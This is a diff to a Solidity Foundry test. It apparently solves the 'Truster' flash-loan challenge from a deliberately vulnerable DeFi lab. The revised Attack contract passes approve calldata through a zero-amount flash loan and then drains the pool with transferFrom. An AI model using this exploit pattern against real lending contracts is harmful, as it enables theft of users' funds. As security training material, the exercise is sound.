@@ -33,6 +33,12 @@ contract ProofsOfConcept is Test {
     }
 
     function testAttack() external {
+        assertEq(valuableToken.balanceOf(attacker), 0);
+        assertEq(
+            valuableToken.balanceOf(address(lenderPool)),
+            FLASH_LOAN_POOL_AMOUNT
+        );
+
         vm.startPrank(attacker);
         Attack attack = new Attack(lenderPool, valuableToken);
         attack.attack(FLASH_LOAN_POOL_AMOUNT);
@@ -73,13 +79,9 @@ contract LoanUser {
 contract Attack {
     using Address for address payable;
 
-    IERC20 public damnValuableToken;
-
     TrusterLenderPool lenderPool;
     DamnValuableToken valuableToken;
     address owner;
-
-    IERC20 invaluableToken;
 
     constructor(
         TrusterLenderPool _rewarderPool,
@@ -88,29 +90,22 @@ contract Attack {
         lenderPool = _rewarderPool;
         valuableToken = _damnValuableToken;
         owner = msg.sender;
-
-        invaluableToken = new InvaluableToken();
-        invaluableToken.transfer(address(lenderPool), 100_000_000);
     }
 
     function attack(uint256 amount) external {
         require(msg.sender == owner, "Only owner can call");
+
         lenderPool.flashLoan(
-            amount,
+            0,
             address(this),
-            address(this),
-            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
+            address(valuableToken),
+            abi.encodeWithSignature(
+                "approve(address,uint256)", //@audit-info no spaces between args
+                address(owner),
+                amount
+            )
         );
-    }
 
-    function receiveFlashLoan(uint256 amount) external {
-        require(msg.sender == address(lenderPool), "Only lenderPool can call");
-    }
-}
-
-contract InvaluableToken is ERC20 {
-    // Decimals are set to 18 by default in `ERC20`
-    constructor() ERC20("InvaluableToken", "IT") {
-        _mint(msg.sender, type(uint256).max);
+        valuableToken.transferFrom(address(lenderPool), address(owner), amount);
     }
 }
